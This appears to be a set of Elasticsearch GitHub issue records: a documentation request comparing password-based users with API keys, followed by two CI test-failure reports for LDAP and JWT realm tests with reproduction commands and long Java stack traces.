It would be helpful to have an introductory guide to API Keys that explain the problems that they're intended to solve, how they work (and why) and potential traps.","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)@tvernum, this sounds like a worthy cause, especially because I hear folks from other teams internally indicate that API keys are the ""preferred"" method of authenticating with Elasticsearch. If there are internal resources that provide some of this background information and problem resolution, please let me know. With the sort of changes we're working through at the moment, it probably makes sense to plan for this to eventually form part of a ""Understanding authentication & authorization models in Elasticsearch"" section.

That would want to cover:

- Users
   - Password based authentication  
      - Reserved Users
      - ES managed users (file, native)
      - Externally managed users (ldap, AD)
   - SSO (SAML, OIDC, Kerberos)
   - Other (PKI, Custom Realms?)
- Token Authentication 
   - Access Tokens
   - API Keys
- Service Accounts

And then for each part think about options such as:
- Interactive login to Kibana
- Use within other Elastic products
- Access via official language clients
- Access via curl
- Access via other tools / clients

But if we try to write all of that now, it will be a huge task and spend a lot of time in reviews. I think it makes sense to approach it in pieces, but with an idea of how it might come together at the end.
In terms of content for the short term:

## Password-based Users

*Strengths / Features*
- Allow you to assign the same permissions (roles) to multiple users
- Allow you to modify permissions (either assign different roles, or edit the roles themselves) as needs change
- Allow you to integrate with an external identity system (e.g. LDAP)
- Are easily supported by a variety of clients tools (""HTTP basic authentication"")

*Limitations*
- If you have multiple clients (e.g filebeat running on a lot of hosts), you need to share a single password across each host, or create multiple users.
- In order to create new users, you must have the `manage_security` privilege, but that privilege is very powerful and gives the ability to create users with any possible role (even `superuser`).

## API Keys

*Strengths / Features*
- The ability to create API keys only requires `manage_own_api_key` and the API keys that are created cannot have more access than the owning user.
- Using a unique API key for each client (host) is easy, because a single user can have multiple API Keys, and the specific API key that performed an operation can be recorded in audit logs.

*Limitations*
- API keys cannot be linked to a central identity store - it is not possible to revoke API key access by de-activating a user in a corporate LDAP directory.
- API keys only support header-based authentication. You cannot authenticate using other mechanisms such as PKI.
- API keys are immutable. You cannot change an API Key's access, you need to create a new API key instead.
- API keys cannot create additional API keys.
- AP keys require a special authentication header that may not be supported (or may be less easily used) in some tools. E.g. in curl, user authentication is as simple as `-u {username}`, but API key authentication requires a custom header `-H ""Authorization: ApiKey {string}""`

## Non-differences
- API Key authentication is not inherently more secure than password authentication. 
   - Notably administrators should treat API key credentials with the same level of care as they would give to a password. The credentials are effectively equivalent (assuming the same set of privileges) 
   - The fact that API keys can be created with less privileges than the owning user _may_ allow for more secure setups. However, the fact the users can be centrally managed (LDAP) may be more secure in some environments.
- With the exception of creating API keys (and features such as alerting that depend on creating new API keys), there is nothing that a User can do that an API key can't - or _vice versa_.
 ",no,">docs,:Security/Authentication,Team:Docs,Team:Security,"
elastic/elasticsearch,963987186,"[CI] SearchGroupsResolverInMemoryTests testResolveWithMissingAttribute failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/dnlnkhfsuqmai/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests/testResolveWithMissingAttribute

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.testResolveWithMissingAttribute"" -Dtests.seed=8098A7D697BD7379 -Dtests.locale=ga -Dtests.timezone=America/Adak -Druntime.java=8`

**Applicable branches:**
7.14

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests&tests.test=testResolveWithMissingAttribute

**Failure excerpt:**
```
org.elasticsearch.common.util.concurrent.UncategorizedExecutionException: Failed execution

  at __randomizedtesting.SeedInfo.seed([8098A7D697BD7379:AFC629F2718AA7D8]:0)
  at org.elasticsearch.common.util.concurrent.FutureUtils.rethrowExecutionException(FutureUtils.java:80)
  at org.elasticsearch.common.util.concurrent.FutureUtils.get(FutureUtils.java:50)
  at org.elasticsearch.action.support.AdapterActionFuture.actionGet(AdapterActionFuture.java:26)
  at org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.resolveGroups(SearchGroupsResolverInMemoryTests.java:164)
  at org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.testResolveWithMissingAttribute(SearchGroupsResolverInMemoryTests.java:121)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:498)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at java.lang.Thread.run(Thread.java:748)

  Caused by: java.util.concurrent.ExecutionException: LDAPException(resultCode=81 (server down), errorMessage='The connection to the directory server was closed while waiting for a response to an asynchronous request.', ldapSDKVersion=4.0.8, revision=28812)

    at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.getValue(BaseFuture.java:262)
    at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.get(BaseFuture.java:249)
    at org.elasticsearch.common.util.concurrent.BaseFuture.get(BaseFuture.java:76)
    at org.elasticsearch.common.util.concurrent.FutureUtils.get(FutureUtils.java:45)
    at org.elasticsearch.action.support.AdapterActionFuture.actionGet(AdapterActionFuture.java:26)
    at org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.resolveGroups(SearchGroupsResolverInMemoryTests.java:164)
    at org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.testResolveWithMissingAttribute(SearchGroupsResolverInMemoryTests.java:121)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:498)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
    at java.lang.Thread.run(Thread.java:748)

    Caused by: com.unboundid.ldap.sdk.LDAPException: The connection to the directory server was closed while waiting for a response to an asynchronous request.

      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.toException(LdapUtils.java:408)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.access$200(LdapUtils.java:54)
      at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils$LdapSearchResultListener.searchResultReceived(LdapUtils.java:515)
      at com.unboundid.ldap.sdk.AsyncSearchHelper.responseReceived(AsyncSearchHelper.java:220)
      at com.unboundid.ldap.sdk.LDAPConnectionReader.closeInternal(LDAPConnectionReader.java:1023)
      at com.unboundid.ldap.sdk.LDAPConnectionReader.close(LDAPConnectionReader.java:969)
      at com.unboundid.ldap.sdk.LDAPConnectionInternals.close(LDAPConnectionInternals.java:655)
      at com.unboundid.ldap.sdk.LDAPConnection.setClosed(LDAPConnection.java:4635)
      at com.unboundid.ldap.sdk.LDAPConnectionReader.closeInternal(LDAPConnectionReader.java:1002)
      at com.unboundid.ldap.sdk.LDAPConnectionReader.run(LDAPConnectionReader.java:404)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,1209563858,"[CI] JwtRealmAuthenticateTests testJwtAuthcRealmAuthenticateWithEmptyRoles failing","The test seems to be somewhat flaky as it failed twice in the past 7 days. The error messages of the two tests are different but both are related to settings.

**Build scan:**
https://gradle-enterprise.elastic.co/s/ow5keqxlpiade/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests/testJwtAuthcRealmAuthenticateWithEmptyRoles

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwtAuthcRealmAuthenticateWithEmptyRoles"" -Dtests.seed=1152DAF9B67D6B79 -Dtests.locale=zh-Hans-SG -Dtests.timezone=Pacific/Niue -Druntime.java=18`

**Applicable branches:**
master

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests&tests.test=testJwtAuthcRealmAuthenticateWithEmptyRoles

**Failure excerpt:**
```
org.elasticsearch.common.settings.SettingsException: Can't get contents for setting [xpack.security.authc.realms.jwt.realm_iss1_4826.pkc_jwkset_path] value [https://127.0.0.1:34477/valid/].

  at __randomizedtesting.SeedInfo.seed([1152DAF9B67D6B79:B620B70F3B66BB7C]:0)
  at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.readUriContents(JwtUtil.java:196)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealm.parseJwksAlgsPkc(JwtRealm.java:225)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealm.<init>(JwtRealm.java:152)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.createJwtRealm(JwtRealmTestCase.java:374)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.generateJwtIssuerRealmPairs(JwtRealmTestCase.java:157)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwtAuthcRealmAuthenticateWithEmptyRoles(JwtRealmAuthenticateTests.java:48)
  at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
  at java.lang.reflect.Method.invoke(Method.java:577)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
  at java.lang.Thread.run(Thread.java:833)

  Caused by: org.elasticsearch.ElasticsearchSecurityException: Get [https://127.0.0.1:34477/valid/] failed.

    at org.elasticsearch.xpack.security.authc.jwt.JwtUtil$1.failed(JwtUtil.java:296)
    at org.apache.http.concurrent.BasicFuture.failed(BasicFuture.java:137)
    at org.apache.http.impl.nio.client.DefaultClientExchangeHandlerImpl.executionFailed(DefaultClientExchangeHandlerImpl.java:101)
    at org.apache.http.impl.nio.client.AbstractClientExchangeHandler.failed(AbstractClientExchangeHandler.java:426)
    at org.apache.http.impl.nio.client.AbstractClientExchangeHandler.connectionRequestFailed(AbstractClientExchangeHandler.java:348)
    at org.apache.http.impl.nio.client.AbstractClientExchangeHandler.access$100(AbstractClientExchangeHandler.java:62)
    at org.apache.http.impl.nio.client.AbstractClientExchangeHandler$1.failed(AbstractClientExchangeHandler.java:392)
    at org.apache.http.concurrent.BasicFuture.failed(BasicFuture.java:137)
    at org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager$1.failed(PoolingNHttpClientConnectionManager.java:316)
    at org.apache.http.concurrent.BasicFuture.failed(BasicFuture.java:137)
    at org.apache.http.nio.pool.AbstractNIOConnPool.fireCallbacks(AbstractNIOConnPool.java:503)
    at org.apache.http.nio.pool.AbstractNIOConnPool.lease(AbstractNIOConnPool.java:290)
    at org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager.requestConnection(PoolingNHttpClientConnectionManager.java:295)
    at org.apache.http.impl.nio.client.AbstractClientExchangeHandler.requestConnection(AbstractClientExchangeHandler.java:377)
    at org.apache.http.impl.nio.client.DefaultClientExchangeHandlerImpl.start(DefaultClientExchangeHandlerImpl.java:129)
    at org.apache.http.impl.nio.client.InternalHttpAsyncClient.execute(InternalHttpAsyncClient.java:141)
    at org.apache.http.impl.nio.client.CloseableHttpAsyncClient.execute(CloseableHttpAsyncClient.java:75)
    at org.apache.http.impl.nio.client.CloseableHttpAsyncClient.execute(CloseableHttpAsyncClient.java:108)
    at org.apache.http.impl.nio.client.CloseableHttpAsyncClient.execute(CloseableHttpAsyncClient.java:92)
    at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.lambda$readBytes$1(JwtUtil.java:273)
    at java.security.AccessController.doPrivileged(AccessController.java:318)
    at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.readBytes(JwtUtil.java:272)
    at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.readUriContents(JwtUtil.java:194)
    at org.elasticsearch.xpack.security.authc.jwt.JwtRealm.parseJwksAlgsPkc(JwtRealm.java:225)
    at org.elasticsearch.xpack.security.authc.jwt.JwtRealm.<init>(JwtRealm.java:152)
    at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.createJwtRealm(JwtRealmTestCase.java:374)
    at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.generateJwtIssuerRealmPairs(JwtRealmTestCase.java:157)
    at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwtAuthcRealmAuthenticateWithEmptyRoles(JwtRealmAuthenticateTests.java:48)
    at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
    at java.lang.reflect.Method.invoke(Method.java:577)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
    at java.lang.Thread.run(Thread.java:833)

    Caused by: java.util.concurrent.TimeoutException: Connection lease request time out

      at org.apache.http.nio.pool.AbstractNIOConnPool.processPendingRequest(AbstractNIOConnPool.java:411)
      at org.apache.http.nio.pool.AbstractNIOConnPool.lease(AbstractNIOConnPool.java:280)
      at org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager.requestConnection(PoolingNHttpClientConnectionManager.java:295)
      at org.apache.http.impl.nio.client.AbstractClientExchangeHandler.requestConnection(AbstractClientExchangeHandler.java:377)
      at org.apache.http.impl.nio.client.DefaultClientExchangeHandlerImpl.start(DefaultClientExchangeHandlerImpl.java:129)
      at org.apache.http.impl.nio.client.InternalHttpAsyncClient.execute(InternalHttpAsyncClient.java:141)
      at org.apache.http.impl.nio.client.CloseableHttpAsyncClient.execute(CloseableHttpAsyncClient.java:75)
      at org.apache.http.impl.nio.client.CloseableHttpAsyncClient.execute(CloseableHttpAsyncClient.java:108)
      at org.apache.http.impl.nio.client.CloseableHttpAsyncClient.execute(CloseableHttpAsyncClient.java:92)
      at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.lambda$readBytes$1(JwtUtil.java:273)
      at java.security.AccessController.doPrivileged(AccessController.java:318)
      at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.readBytes(JwtUtil.java:272)
      at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.readUriContents(JwtUtil.java:194)
      at org.elasticsearch.xpack.security.authc.jwt.JwtRealm.parseJwksAlgsPkc(JwtRealm.java:225)
      at org.elasticsearch.xpack.security.authc.jwt.JwtRealm.<init>(JwtRealm.java:152)
      at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.createJwtRealm(JwtRealmTestCase.java:374)
      at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.generateJwtIssuerRealmPairs(JwtRealmTestCase.java:157)
      at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwtAuthcRealmAuthenticateWithEmptyRoles(JwtRealmAuthenticateTests.java:48)
      at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
      at java.lang.reflect.Method.invoke(Method.java:577)
      at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
      at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
      at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
      at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
      at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
